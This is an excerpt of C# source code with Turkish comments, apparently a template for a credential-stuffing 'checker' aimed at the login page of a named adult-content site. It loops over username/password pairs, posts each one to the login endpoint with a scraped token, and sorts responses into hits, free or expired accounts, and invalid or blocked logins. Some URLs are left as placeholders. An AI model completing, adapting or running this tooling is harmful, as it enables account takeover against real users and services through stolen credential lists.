...
namespace Checker_Source_Code
{
    internal class Checker_Main
    {
        ...
        static string myTitle = "Checker Adı [->] By Checkerı Yapan Kişi";
            ...
            if (flag)
            {
                ...
                while (coqueue.Count > 0)
                {
                    ...
                    try
                    {
                        ...
                        httpRequest.AddHeader("Referer", "https://secure.javhd.com/login/?back=javhd.com&path=L2VuLw&lang=en&nats=MC4wLjIuMi4wLjAuMC4wLjA");
                        httpRequest.AddHeader("Origin", "https://secure.javhd.com");
                        httpRequest.AddHeader("Host", "secure.javhd.com");

                        //Get Request Örneği
                        //Response1 değiştirilebilir isimdir.
                        string response1 = httpRequest.Get("Get Linki").ToString();

                        //Parse Örneği
                        //response1'den get aldığı veriyi yazdığınız ilk ve son satırın arasındaki metni çeker
                        //parse1 değiştirilebilir isimdir.
                        string parse1 = Parse(response1, "ilk satır", "son satır");
                        ...
                        //postdata örneği
                        string postdata = "path=L2VuLw&v=join&login=" + array[0] + "&password=" + array[1] + "&back=javhd.com&ch=" + parse1;



                        //post örneği
                        string response2 = httpRequest.Post("Post Linki", postdata, "Content-Type Türü").ToString();

                        //Hits
                        if (response2.Contains("giriş başarılı succes key") && !response2.Contains("/upgrade"))
                        {
                        ...
                        //Free-Custom
                        //if ((response2.Contains(">Profile<") && response2.Contains("/upgrade")) || response2.Contains(">Expired Access<"))
                        //{
                        //    // Capture alırsan capture=Parse gönder
                        //    string capture = "-Free";
                        //    free++;
                        ...
                        //if (response2.Contains("Wrong username or password") || response2.Contains("number of unsuccessful login attempts left") || response2.Contains("Sorry, but your account has been blocked."))
                        //{
                        //    invalids++;
                        //    GlobalData.LastChecks++;
                        //}
